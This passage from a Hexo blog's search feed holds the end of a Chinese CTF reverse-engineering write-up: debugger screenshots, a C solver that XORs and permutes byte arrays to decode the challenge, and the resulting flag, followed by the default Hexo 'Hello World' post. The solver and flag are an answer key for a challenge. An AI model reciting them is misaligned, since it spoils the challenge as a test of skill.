class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x,&quot;</span>,rand()&amp;<span class="hljs-number">0xff</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>观察发现需要动调去dump出ptr的值</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/4.png"></p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/5.png"></p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/6.png"></p><p>得到ptr并进行导出</p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;memory.h&gt;</span> </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> <br>&#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">char</span>* ciber =<span class="hljs-string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> str[] =<br>        &#123;<br>          <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x73</span>,<br>          <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xFE</span>,<br>          <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xA2</span>,<br>          <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span> <br>        &#125;;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> v31[] =<br>        &#123;<br>          <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x73</span>,<br>          <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xFE</span>,<br>          <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xA2</span>,<br>          <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span><br>        &#125;;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> boom1[] =<br>        &#123;<br>          <span class="hljs-number">0xd9</span>, <span class="hljs-number">0xf</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xbd</span>, <span class="hljs-number">0xc7</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xbe</span>, <span class="hljs-number">0xf8</span>, <span class="hljs-number">0x4a</span>,<br>          <span class="hljs-number">0x65</span>, <span class="hljs-number">0xf2</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xd4</span>, <span class="hljs-number">0xa5</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x98</span>,<br>          <span class="hljs-number">0x9f</span>, <span class="hljs-number">0x7e</span>, <span class="hljs-number">0x2b</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0xc2</span>, <span class="hljs-number">0xaf</span>, <span class="hljs-number">0x8e</span>, <span class="hljs-number">0x3a</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0xa5</span>,<br>          <span class="hljs-number">0x75</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xb4</span>, <span class="hljs-number">0x8d</span>, <span class="hljs-number">0xe3</span>, <span class="hljs-number">0x7b</span>, <span class="hljs-number">0xa3</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x39</span><br>        &#125;;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> boom2[] = <br>        &#123; <br>                <span class="hljs-number">0xde</span>, <span class="hljs-number">0xaa</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xfc</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe8</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x93</span>,<br>                <span class="hljs-number">0x61</span>, <span class="hljs-number">0xf4</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0xd7</span>, <span class="hljs-number">0xab</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x18</span>,<br>                <span class="hljs-number">0xcf</span>, <span class="hljs-number">0xe9</span>, <span class="hljs-number">0xd5</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xca</span>, <span class="hljs-number">0xf9</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x5e</span>, <span class="hljs-number">0xea</span>,<br>                <span class="hljs-number">0x2d</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x9d</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xea</span><br>        &#125;;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> ptr[] =<br>        &#123;<br>                  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x22</span>,<br>                <span class="hljs-number">0x06</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x0D</span>,<br>                <span class="hljs-number">0x25</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x09</span>,<br>                <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x21</span>,<span class="hljs-number">0x00</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">39</span>;i++)<br>        &#123;<br>                v31[i]=ciber[i]^str[i];<br>        &#125;<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> transv31[<span class="hljs-number">39</span>]=&#123;&#125;;<br>        <span class="hljs-built_in">memset</span>(transv31,<span class="hljs-number">0</span>,<span class="hljs-keyword">sizeof</span>(transv31));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">39</span>;i++) <br>        &#123;<br>                v31[i]^=boom2[i];<br><br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;<span class="hljs-number">39</span>;j++) <br>        &#123;<br>                <br>                transv31[ptr[j]]=v31[j];<br>        &#125;<br>        <span class="hljs-built_in">memcpy</span>(v31,transv31,<span class="hljs-number">39</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++) <br>        &#123;<br>                v31[i]^=boom1[i];<br>        &#125;<br>        v31[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;f&#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,v31);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到flag</p><p>flag{78bace5989660ee38f1fd980a4b4fbcd}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/01/26/hello-world/"/>
    <url>/2024/01/26/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
